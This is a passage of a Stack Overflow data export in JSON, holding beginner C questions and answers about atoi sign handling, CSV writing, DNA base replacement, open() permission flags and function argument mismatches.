0, "answer_count": 3, "score": 2, "last_activity_date": 1437562530, "creation_date": 1437561640, "last_edit_date": 1437561882, "question_id": 31560778, "link": "https://stackoverflow.com/questions/31560778/why-doesnt-my-atoi-implementation-work-with-negative-numbers", "title": "Why doesn&#39;t my atoi implementation work with negative numbers?", "body": "<pre><code>#include&lt;stdio.h&gt;\n\nint ft_atoi(char *str)\n{\n    int i;\n    int sign;\n    int val;\n    int nbr;\n\n    i = 0;\n    sign = 1;\n    val = 0;\n    nbr = 0;\n    while(str[i] != '\\0')\n    {\n        if (str[i] == '-')\n            sign = -sign;\n        i++;\n    }\n    i = 0;\n    while(str[i] &gt;= '0' &amp;&amp; str[i] &lt;= '9' &amp;&amp; str[i] != '\\0')\n    {\n        nbr = (int) (str[i] - '0');\n        val = (val * 10) + nbr;\n        i++;\n    }\n    i++;\n    return (val * sign);\n}\n</code></pre>\n\n<p>It returns 0 when I try with negative numbers.</p>\n"}, {"tags": ["c", "excel", "csv"], "comments": [{"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 3, "creation_date": 1437561056, "post_id": 31560501, "comment_id": 51077070, "body": "You can&#39;t do that. Files are written sequentially, character-by-character, line-by-line."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1437561752, "post_id": 31560501, "comment_id": 51077515, "body": "This is not your real output, the <code>,</code> is missing. Show us the actual thing please."}, {"owner": {"reputation": 1, "user_id": 5105578, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7413aeb03a7fa9777f25c06308ac266b?s=128&d=identicon&r=PG&f=1", "display_name": "artificial electron", "link": "https://stackoverflow.com/users/5105578/artificial-electron"}, "edited": false, "score": 0, "creation_date": 1437562061, "post_id": 31560501, "comment_id": 51077709, "body": "Sourav:- I have copy and paste the program from my question for precaution, I am again getting the same output as I mentioned, Although I  have include a space between &#39;A&#39; and &#39;B&#39; just to make my question easy to understand."}], "answers": [{"tags": [], "owner": {"reputation": 453, "user_id": 4743133, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c4e1645f846ef7aee07092bfd003337b?s=128&d=identicon&r=PG", "display_name": "Sun Dro", "link": "https://stackoverflow.com/users/4743133/sun-dro"}, "is_accepted": false, "score": 0, "last_activity_date": 1437562436, "creation_date": 1437562436, "answer_id": 31561078, "question_id": 31560501, "link": "https://stackoverflow.com/questions/31560501/unable-to-jump-from-one-place-another-properly-in-excel-file-using-c/31561078#31561078", "title": "Unable to jump from one place another properly in excel file using C", "body": "<p>You can parse line and join parsed part and a new part and write to file again. I think its not the best way but it works.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    FILE *fp, *fp2;\n    size_t len = 0;\n    ssize_t read;\n    char * line = NULL;\n\n    /* Write first part \"A\" */\n    fp = fopen(\"Filename.csv\", \"w\");\n    if(fp == NULL)\n    {\n        printf(\"Couldn't open file\\n\");\n        return 0;\n    }\n\n    /* Write and done */\n    for (int j = 0; j&lt;5; j++) fprintf(fp, \"A\\n\");    \n    fclose(fp);\n\n\n    /* Open templorary file */\n    fp = fopen(\"file.tmp\", \"a\");\n    if (fp != NULL) \n    {\n        /* Open exiting file */\n        fp2 = fopen(\"Filename.csv\", \"r\");\n        if(fp2 != NULL)\n        {\n            /* Read from exing file */\n            while ((read = getline(&amp;line, &amp;len, fp2)) != -1) \n            {\n                /* Remove new line character */\n                sscanf(line, \"%512[^\\n]\\n\", line);\n\n                /* Join and write to file */\n                sprintf(line, \"%s B\", line);\n                fprintf(fp, \"%s\\n\", line);\n            }\n\n            /* Clean up memory */\n            fclose(fp2);\n            if (line) free(line);\n        }\n\n        /* End up */\n        fclose(fp);\n        remove(\"Filename.csv\");\n        rename(\"file.tmp\", \"Filename.csv\");\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5105578, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7413aeb03a7fa9777f25c06308ac266b?s=128&d=identicon&r=PG&f=1", "display_name": "artificial electron", "link": "https://stackoverflow.com/users/5105578/artificial-electron"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1442276710, "creation_date": 1437560908, "last_edit_date": 1442276710, "question_id": 31560501, "link": "https://stackoverflow.com/questions/31560501/unable-to-jump-from-one-place-another-properly-in-excel-file-using-c", "title": "Unable to jump from one place another properly in excel file using C", "body": "<p>I am writing a code in C to write data in <code>.csv</code> file. In this code I am just writing <code>A</code> in first column for five time then trying to write <code>B</code> from beginning of next column. Here is my code:-</p>\n\n<pre><code>#include \"stdafx.h\"\n#include&lt;stdio.h&gt;\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    FILE *fp;\n    fp = fopen(\"Filename.csv\", \"w\");\n    if(fp == NULL)\n    {\n    printf(\"Couldn't open file\\n\");\n    return 0;\n    }\n\n    for (int j = 0; j&lt;5; j++)\n    {\n    fprintf(fp, \"A\\n\");    \n    }\n\n    for (int j = 0; j&lt;5; j++)\n    {\n    fprintf(fp, \",B\\n\");    \n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>My output expectation is like this:-</p>\n\n<pre><code>A B\nA B\nA B\nA B\nA B\n</code></pre>\n\n<p>But I am getting output like this:-</p>\n\n<pre><code>A\nA\nA\nA\nA\n  B\n  B\n  B\n  B\n  B\n</code></pre>\n\n<p>My idea is to learn to jump any <code>column-row</code> to any <code>column-row</code> is <code>.csv</code> file.\nSo, please help me to learn how to jump anywhere in the file.</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437568606, "post_id": 31560190, "comment_id": 51082249, "body": "When compiling, always enable the compiler warnings.  (for gcc, at a minimum, &#39;-Wall -Wextra -pedantic&#39;)   Then fix the warnings."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437570357, "post_id": 31560190, "comment_id": 51083589, "body": "regarding this line:  &#39;scanf(&quot;%s&quot;,&amp;dnaPtn);&#39;  1) dnaPtn is an array.  in C, an array name degrades to the address of the array, so using the &#39;&amp;&#39; is incorrect.  2) when inputting a string, using &quot;%s&quot;, always include a max length modifier so the user cannot overrun the input buffer"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4756884"}, "edited": false, "score": 0, "creation_date": 1437560230, "post_id": 31560229, "comment_id": 51076510, "body": "I am emphatically agreeing with the important message you provided"}, {"owner": {"reputation": 11, "user_id": 5142976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a4ef1a412e4f3856e5133d779743c50?s=128&d=identicon&r=PG&f=1", "display_name": "Aegus", "link": "https://stackoverflow.com/users/5142976/aegus"}, "edited": false, "score": 0, "creation_date": 1437560627, "post_id": 31560229, "comment_id": 51076771, "body": "what is null-terminate? :("}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 11, "user_id": 5142976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a4ef1a412e4f3856e5133d779743c50?s=128&d=identicon&r=PG&f=1", "display_name": "Aegus", "link": "https://stackoverflow.com/users/5142976/aegus"}, "edited": false, "score": 0, "creation_date": 1437560937, "post_id": 31560229, "comment_id": 51076984, "body": "@Aegus add <code>int len = strlen(dnaPtn). for (i = 0; i &lt; len; i++) { ..&#47;&#47;do something}  rDnaPtn[i] = &#39;\\0&#39;;</code>"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 4, "last_activity_date": 1437560826, "last_edit_date": 1437560826, "creation_date": 1437560028, "answer_id": 31560229, "question_id": 31560190, "link": "https://stackoverflow.com/questions/31560190/dna-replication-program-generating-wrong-output/31560229#31560229", "title": "DNA replication program generating wrong output", "body": "<p>In your code,</p>\n\n<pre><code> rDnaPtn[i] = \"t\";\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>rDnaPtn[i] = 't';\n</code></pre>\n\n<p>as the <code>\"\"</code> denotes a <em>string</em> but what you want is of type <code>char</code>.</p>\n\n<p>After that, </p>\n\n<ul>\n<li>don't forget to null-terminate your destination array.</li>\n<li><code>scanf(\"%s\",&amp;dnaPtn);</code> can be re-written as <code>scanf(\"%s\",dnaPtn);</code></li>\n<li>Don't loop over the <em>entire</em> array. make use of <code>strlen()</code>.</li>\n</ul>\n\n<hr>\n\n<p><strong>Enable compiler warnings.</strong></p>\n"}], "owner": {"reputation": 11, "user_id": 5142976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a4ef1a412e4f3856e5133d779743c50?s=128&d=identicon&r=PG&f=1", "display_name": "Aegus", "link": "https://stackoverflow.com/users/5142976/aegus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1437616644, "creation_date": 1437559935, "last_edit_date": 1437616644, "question_id": 31560190, "link": "https://stackoverflow.com/questions/31560190/dna-replication-program-generating-wrong-output", "title": "DNA replication program generating wrong output", "body": "<p>What is the problem with that code, I just want to replace the DNA's bases.:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint getDna(){\n    int i,t;\n    printf(\"How many protein does the DNA have?\");\n    scanf(\"%d\",&amp;t);\n    char dnaPtn[t],rDnaPtn[t];\n    printf(\"Enter the DNA: \");\n    scanf(\"%s\",&amp;dnaPtn);\n    for(i=0;i&lt;t;i++){\n        switch(dnaPtn[i]){\n            case 'a':\n                rDnaPtn[i] = \"t\";\n                break;\n            case 'c':\n                rDnaPtn[i] = \"g\";\n                break;\n            case 'g':\n                rDnaPtn[i] = \"c\";\n                break;\n            case 't':\n                rDnaPtn[i] = \"a\";\n                break;\n            default:\n                break;\n        }\n    }\n    printf(\"%s\",rDnaPtn);\n}\n\nint main(){\n    getDna();\n    return 0;\n}\n</code></pre>\n\n<p>The output of <code>agcta</code> is:</p>\n\n<p>How many protein does the DNA have: 5</p>\n\n<pre><code>Enter the DNA: agcta\n^b'd^!!@\n</code></pre>\n\n<p>What is wrong?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 4, "creation_date": 1437559551, "post_id": 31559967, "comment_id": 51076029, "body": "What do you think <code>O_WRONLY</code> means ?"}, {"owner": {"reputation": 23445, "user_id": 416224, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/8dc3ac9987d21288deea853f47d8dd6e?s=128&d=identicon&r=PG&f=1", "display_name": "kay", "link": "https://stackoverflow.com/users/416224/kay"}, "edited": false, "score": 0, "creation_date": 1437559760, "post_id": 31559967, "comment_id": 51076183, "body": "I don&#39;t understand the question. Do you want <code>write(fd,&quot;created&quot;,7)</code> to fail?"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1437559886, "post_id": 31559967, "comment_id": 51076269, "body": "Use <code>perror</code> to handle failure of <code>open</code> or <code>write</code> or <code>close</code>  (at least during debugging phase)."}, {"owner": {"reputation": 73, "user_id": 3351883, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/94640448453d5f40023b600aab68601e?s=128&d=identicon&r=PG", "display_name": "user173717", "link": "https://stackoverflow.com/users/3351883/user173717"}, "edited": false, "score": 0, "creation_date": 1437560554, "post_id": 31559967, "comment_id": 51076730, "body": "This is just test code. I think when we set file permission S_IRUSR mean the file xxx had only READ permission, but in first time I ran executable file the file <b>xxx</b> has &quot;created&quot; line. I think when a file has only READ permission, I can&#39;t be written to."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437561278, "post_id": 31559967, "comment_id": 51077233, "body": "Your question contradicts &quot;you want to write without permission or you don&#39;t want that &quot;?"}, {"owner": {"reputation": 73, "user_id": 3351883, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/94640448453d5f40023b600aab68601e?s=128&d=identicon&r=PG", "display_name": "user173717", "link": "https://stackoverflow.com/users/3351883/user173717"}, "edited": false, "score": 0, "creation_date": 1437561335, "post_id": 31559967, "comment_id": 51077269, "body": "Sorry for confuse question, I don&#39; want to write to this file."}], "answers": [{"comments": [{"owner": {"reputation": 73, "user_id": 3351883, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/94640448453d5f40023b600aab68601e?s=128&d=identicon&r=PG", "display_name": "user173717", "link": "https://stackoverflow.com/users/3351883/user173717"}, "edited": false, "score": 0, "creation_date": 1437561668, "post_id": 31560514, "comment_id": 51077466, "body": "Ok, I get it. I thought when fopen created file with only READ permission, so even if we set O_WRONLY mode, we couldn&#39;t write to created file."}], "tags": [], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "is_accepted": false, "score": 2, "last_activity_date": 1437568896, "last_edit_date": 1437568896, "creation_date": 1437560926, "answer_id": 31560514, "question_id": 31559967, "link": "https://stackoverflow.com/questions/31559967/write-to-file-without-write-permission-in-c/31560514#31560514", "title": "Write to file without write permission in C?", "body": "<p>You should remove:</p>\n\n<blockquote>\n<pre><code>O_WRONLY\n</code></pre>\n</blockquote>\n\n<p>And it should look like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n    int fd;\n    fd=open(\"test.sh\",O_CREAT|O_APPEND,S_IRUSR);\n\n    if(fd==-1)\n        return 0;\n    else\n        if(write(fd,\"created\",7)==-1)\n            return 0;\n    if(close(fd)==-1)\n        return 0;\n    printf(\"OK\");\n\n    return 0;\n}\n</code></pre>\n\n<p>And if you try to write that file, you will get:</p>\n\n<blockquote>\n<pre><code>[ Error writing test.sh: Permission denied ]\n</code></pre>\n</blockquote>\n\n<p>Anyway, on my Linux machine if I wanna check that file, I will do it like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n\nvoid fileCheck(const char *fileName){\n\n    if(!access(fileName, F_OK )){\n        printf(\"The File %s\\t Found\\n\",fileName);\n    }else{\n        printf(\"The File %s\\t not Found\\n\",fileName);\n        exit(1);\n    }\n\n    if(!access(fileName, R_OK )){\n        printf(\"The File %s\\t can be read\\n\",fileName);\n    }else{\n        printf(\"The File %s\\t cannot be read\\n\",fileName);\n    }\n\n    if(!access( fileName, W_OK )){\n        printf(\"The File %s\\t it can be Edited\\n\",fileName);\n    }else{\n        printf(\"The File %s\\t it cannot be Edited\\n\",fileName);\n    }\n\n    if(!access( fileName, X_OK )){\n        printf(\"The File %s\\t is an Executable\\n\",fileName);\n    }else{\n        printf(\"The File %s\\t is not an Executable\\n\",fileName);\n    }\n}\n\nint main (void){\n   char *fileName = \"test.sh\";\n\n    fileCheck(fileName);\n\n   return 0;\n}\n</code></pre>\n\n<p>And the output says:</p>\n\n<blockquote>\n<pre><code>The File test.sh   Found\nThe File test.sh     can be read\nThe File test.sh     it cannot be Edited\nThe File test.sh     is not an Executable\n</code></pre>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 4523, "user_id": 2998877, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/be042cb19c34a4685d70997d44827b1a?s=128&d=identicon&r=PG&f=1", "display_name": "Spark.Bao", "link": "https://stackoverflow.com/users/2998877/spark-bao"}, "is_accepted": true, "score": 1, "last_activity_date": 1437568386, "last_edit_date": 1437568386, "creation_date": 1437567528, "answer_id": 31562930, "question_id": 31559967, "link": "https://stackoverflow.com/questions/31559967/write-to-file-without-write-permission-in-c/31562930#31562930", "title": "Write to file without write permission in C?", "body": "<p>I can understand author's intent. He want to test the usage of <code>S_IRUSR</code>. I will explain why it doesn't work at first time.</p>\n\n<p>At first let us resolve your question. you can just remove <code>O_WRONLY</code> and <code>O_APPEND</code> flag, and add <code>O_RDONLY</code> flag or not. Codes are following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n\nint main() {\n    int fd;\n    fd = open(\"xxx\", O_CREAT|O_RDONLY, S_IRUSR);\n    // or\n    // fd = open(\"xxx\", O_CREAT, S_IRUSR);\n    if (fd == -1) {\n        printf(\"open failed\\n\");\n        return 0;\n    } else {\n        if (write(fd, \"created\", 7) == -1) {\n            printf(\"write failed\\n\");\n            return 0;\n        }\n    }\n    if (close(fd) == -1) {\n        printf(\"close failed\\n\");\n        return 0;\n    }\n    printf(\"OK\\n\");\n} \n</code></pre>\n\n<p>then execute the program whenever, it will always says \"write failed\", and \"xxx\" is empty.</p>\n\n<blockquote>\n  <p>$ ls<br>\n  test.c<br>\n  $ make test<br>\n  cc     test.c   -o test<br>\n  $ ls<br>\n  test  test.c<br>\n  $ ./test<br>\n  write failed<br>\n  $ ls<br>\n  test  test.c  xxx<br>\n  $ cat xxx<br>\n  $ ./test<br>\n  write failed   </p>\n</blockquote>\n\n<p>you said:</p>\n\n<blockquote>\n  <p>Of cource, when I ran executable after first time, it worked like I expect when it could't be written to. </p>\n</blockquote>\n\n<p>in fact, if use your code, ran after first time, it is not couldn't be written to, it is not be open.</p>\n\n<blockquote>\n  <p>$ ls<br>\n  test  test.c<br>\n  $ ./test<br>\n  OK<br>\n  $ ls<br>\n  test  test.c  xxx<br>\n  $ cat xxx<br>\n  created<br>\n  $ ./test<br>\n  open failed  </p>\n</blockquote>\n\n<p>Then let us face the more important question, why <code>S_ISUSR</code> doens't work at first time. let us run 'man 2 open', it says:</p>\n\n<blockquote>\n  <p>Note that this mode  applies  only  to  future accesses of the newly created file; the open() call that creates a read-only file may well return a read/write file descriptor.</p>\n</blockquote>\n\n<p>It means <code>S_ISUSR</code> only works after first time. Even <code>S_ISUSR</code> is read only, but in fact still return read/write permission, the final permission depends on the flags, if the flag is <code>O_WRONLY</code>, it can only write when create, if the flag is <code>O_RDONLY</code>, it can only read when create.</p>\n\n<p>let's do a test:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n\nint main() {\n    int fd;\n    char buf[10];\n    fd = open(\"xxx\", O_CREAT|O_WRONLY, S_IRUSR);\n    if (fd == -1) {\n        printf(\"open failed\\n\");\n        return 0;\n    } else {\n        if (write(fd, \"created\", 7) == -1) {\n            printf(\"write failed\\n\");\n            return 0;\n        }\n    }\n    if (read(fd, buf, 7) == -1) {\n        printf(\"read failed\\n\");\n        return 0;\n    } else {\n        printf(buf);\n    }\n    if (close(fd) == -1) {\n        printf(\"close failed\\n\");\n        return 0;\n    }\n    printf(\"OK\\n\");\n} \n</code></pre>\n\n<p>and result is expected, at first time, when file create, if has write permission and has no read permission, after first time, it open failed:</p>\n\n<blockquote>\n  <p>$ ls<br>\n  test.c<br>\n  $ make test<br>\n  cc     test.c   -o test<br>\n  $ ./test<br>\n  read failed<br>\n  $ ./test<br>\n  open failed<br>\n  $ cat xxx<br>\n  created  </p>\n</blockquote>\n\n<p>And I can understand why they design the mode parameter only work after first time. You think, if <code>S_IRUSR</code> works when file create, then the file is always empty and read only, it has no sense.</p>\n"}], "owner": {"reputation": 73, "user_id": 3351883, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/94640448453d5f40023b600aab68601e?s=128&d=identicon&r=PG", "display_name": "user173717", "link": "https://stackoverflow.com/users/3351883/user173717"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1456, "favorite_count": 0, "accepted_answer_id": 31562930, "answer_count": 2, "score": 1, "last_activity_date": 1437568896, "creation_date": 1437559389, "last_edit_date": 1437568824, "question_id": 31559967, "link": "https://stackoverflow.com/questions/31559967/write-to-file-without-write-permission-in-c", "title": "Write to file without write permission in C?", "body": "<p>I want to create a file and the file has no write permission like this. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n\nmain()\n{\n    int fd;\n    fd=open(\"xxx\",O_CREAT|O_WRONLY|O_APPEND,S_IRUSR);\n    if(fd==-1)\n        return 0;\n    else\n        if(write(fd,\"created\",7)==-1)\n            return 0;\n    if(close(fd)==-1)\n        return 0;\n    printf(\"OK\");\n}   \n</code></pre>\n\n<p>I ran executable file and notice that the file <strong>xxx</strong> could be written to. Of cource, when I ran executable after first time, it worked like I expect when it could't be written to. </p>\n\n<p>But how can I make the file <strong>xxx</strong> even can't be written to in first time (when it is created). </p>\n"}, {"tags": ["c", "macos", "function", "argument-passing", "function-calls"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1437559369, "post_id": 31559929, "comment_id": 51075900, "body": "<code>What do I do?</code>--&gt; provide correct number of arguments . Period."}, {"owner": {"reputation": 5272, "user_id": 1094311, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DdgPu.jpg?s=128&g=1", "display_name": "1983", "link": "https://stackoverflow.com/users/1094311/1983"}, "edited": false, "score": 0, "creation_date": 1437559748, "post_id": 31559929, "comment_id": 51076178, "body": "Too many arguments for remainingAngle, not printf."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437571169, "post_id": 31559929, "comment_id": 51084152, "body": "regarding this kind of line: &#39;float angleA = 30.0;&#39;   The variable &#39;angleA&#39; is declared as float, so the initialization value needs to also be declared as float;   Suggest: &#39;float angleA = 30.0f;&#39;   Note the trailing &#39;f&#39;.   The posted code is using a &#39;double&#39; initializer (the default when a decimal point in the initializer is double, unless specifically declared otherwise via the trailing &#39;f&#39;)"}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 1, "last_activity_date": 1437566241, "last_edit_date": 1437566241, "creation_date": 1437559447, "answer_id": 31559992, "question_id": 31559929, "link": "https://stackoverflow.com/questions/31559929/too-many-arguments-to-function-call-what-do-i-do/31559992#31559992", "title": "Too many arguments to function call, What do I do?", "body": "<p>In your function definition</p>\n\n<pre><code>float remainingAngle(float answer)\n</code></pre>\n\n<p>the function <code>remainingAngle()</code> accepts one parameter.</p>\n\n<p>OTOH, in your function call</p>\n\n<pre><code>remainingAngle(angleA,angleB);\n</code></pre>\n\n<p>you're passing two arguments.</p>\n\n<p>The supplied argument number and type should match with the parameter list in function definition.</p>\n\n<hr>\n\n<p>That said, your code is wrong.</p>\n\n<ul>\n<li><p><strong>Point 1.</strong> Your local variables will <em>shadow</em> the global ones. Maybe that's not what you want. Change</p>\n\n<pre><code>float angleA = 30.0;\nfloat angleB = 60.0;\n</code></pre>\n\n<p>to</p>\n\n<pre><code> angleA = 30.0;\n angleB = 60.0;\n</code></pre></li>\n<li><p><strong>Point 2.</strong>  The function</p>\n\n<pre><code>float remainingAngle(float answer)\n{\n    float answer= angleA+angleB;\n//redefinition of answer\n return 0;\n}\n</code></pre>\n\n<p>is logically wrong. It should rather be</p>\n\n<pre><code>float remainingAngle(void)\n{\n    float answer= angleA+angleB;\n    return answer;\n}\n</code></pre>\n\n<p>and should be called like</p>\n\n<pre><code>float angleC = remainingAngle();\n</code></pre></li>\n</ul>\n\n<hr>\n\n<p>AFTER EDIT:</p>\n\n<p>as per your requirement,  you can do</p>\n\n<pre><code>float remainingAngle(float angleA, float angleB)\n{\n    float answer= angleA+angleB;\n    return answer;\n}\n</code></pre>\n\n<p>However, this makes the global variables useless.</p>\n"}, {"comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437560230, "post_id": 31560227, "comment_id": 51076511, "body": "You&#39;re right, but in this case, <code>angleA</code> and <code>angleB</code>  being global, it&#39;s not required to be passed as parameters. :-)"}, {"owner": {"reputation": 153, "user_id": 4781887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/931bb8a07a2449a7aa88f8204593f7f9?s=128&d=identicon&r=PG&f=1", "display_name": "DamBedEi", "link": "https://stackoverflow.com/users/4781887/dambedei"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437560386, "post_id": 31560227, "comment_id": 51076629, "body": "I know, I just wrote it like this in case the variables are not global. Then he also knows what&#39;s going on."}, {"owner": {"reputation": 11, "user_id": 4119554, "user_type": "registered", "profile_image": "https://graph.facebook.com/1279992956/picture?type=large", "display_name": "Ethan Cole Merbaum", "link": "https://stackoverflow.com/users/4119554/ethan-cole-merbaum"}, "edited": false, "score": 0, "creation_date": 1437560428, "post_id": 31560227, "comment_id": 51076658, "body": "I think I got it, I took your suggestion, removed the static floats, and changed the return function to &quot;180-answer&quot; this way the angle is inversely related to the increase in a+b&quot;"}], "tags": [], "owner": {"reputation": 153, "user_id": 4781887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/931bb8a07a2449a7aa88f8204593f7f9?s=128&d=identicon&r=PG&f=1", "display_name": "DamBedEi", "link": "https://stackoverflow.com/users/4781887/dambedei"}, "is_accepted": false, "score": 0, "last_activity_date": 1437560015, "creation_date": 1437560015, "answer_id": 31560227, "question_id": 31559929, "link": "https://stackoverflow.com/questions/31559929/too-many-arguments-to-function-call-what-do-i-do/31560227#31560227", "title": "Too many arguments to function call, What do I do?", "body": "<p>In addition to Souravs answer you could also do the following:</p>\n\n<pre><code>float remainingAngle(float angA, float angB)\n{\n    float answer = angA + angB;\n    return answer;\n}\n</code></pre>\n\n<p>So your call will stay the same.</p>\n\n<p>And for the logical side, what you do is:</p>\n\n<p>You pass two arguments (value of <code>angleA</code> and value of <code>angleB</code>) to the function <code>remainingAngle</code>. There you do the calculation and return the result (<code>answer</code>).</p>\n"}, {"tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": false, "score": 0, "last_activity_date": 1437560279, "creation_date": 1437560279, "answer_id": 31560299, "question_id": 31559929, "link": "https://stackoverflow.com/questions/31559929/too-many-arguments-to-function-call-what-do-i-do/31560299#31560299", "title": "Too many arguments to function call, What do I do?", "body": "<p>The design of your function isn't good:</p>\n\n<pre><code>static float angleB;\nstatic float angleA;\n\nfloat remainingAngle(float answer)\n{\n    float answer= angleA+angleB;\n//redefinition of answer\n return 0;\n}\n</code></pre>\n\n<blockquote>\n  <p>What do I do?</p>\n</blockquote>\n\n<ul>\n<li>There's no point is passing in the answer; the answer is what you want to receive. (There's also no point in passing \"space\"  for the answer. The anser is a <code>float</code>, a scalar variable. Just pass that around.) 